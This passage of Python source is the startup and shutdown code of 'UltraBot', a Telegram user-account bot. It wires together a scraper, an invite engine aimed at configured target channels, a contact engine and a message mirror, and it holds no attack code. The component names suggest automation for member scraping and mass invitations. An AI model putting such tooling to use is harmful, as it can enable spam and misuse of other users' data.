        await self.db.init_db()
        asyncio.create_task(self.telemetry.start())
        
        await self.client.start(phone=Config.PHONE_NUMBER)
        me = await self.client.get_me()
        log.info(f"Authenticated as: {me.username or me.first_name} (ID: {me.id})")

        if Config.TARGET_CHANNELS:
            self._targets = await self.engine.resolve_targets(Config.TARGET_CHANNELS)
            self.invite_engine = InviteEngine(self.engine, self.db, self._targets)

        self.router = CommandRouter(self.client, self.db, self.scraper, self.invite_engine, self.contact_engine)
        await self.router.setup()
        
        # Initialize the Message Mirror Engine
        await self.mirror_engine.setup()

        try:
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try: loop.add_signal_handler(sig, self._signal_handler)
                except NotImplementedError: pass
        except Exception: pass

        log.info("✅ UltraBot is ready. Send commands in Saved Messages.")
        await self._stop_event.wait()
        await self._shutdown()

    def _signal_handler(self) -> None:
        log.warning("Shutdown signal received."); self._stop_event.set()

    async def _shutdown(self) -> None:
        await self.client.disconnect()
        log.info("─── UltraBot stopped cleanly ───")

async def _main() -> None:
    if not Config.API_ID or not Config.API_HASH:
        log.critical("API_ID or API_HASH missing in .env file!"); sys.exit(1)
    app = UltraBotApp()
    await app.start()

if __name__ == "__main__":
    try: asyncio.run(_main())
    except KeyboardInterrupt: pass
    except Exception as e:
        log.critical(f"Fatal: {e}", exc_info=True); sys.exit(1)
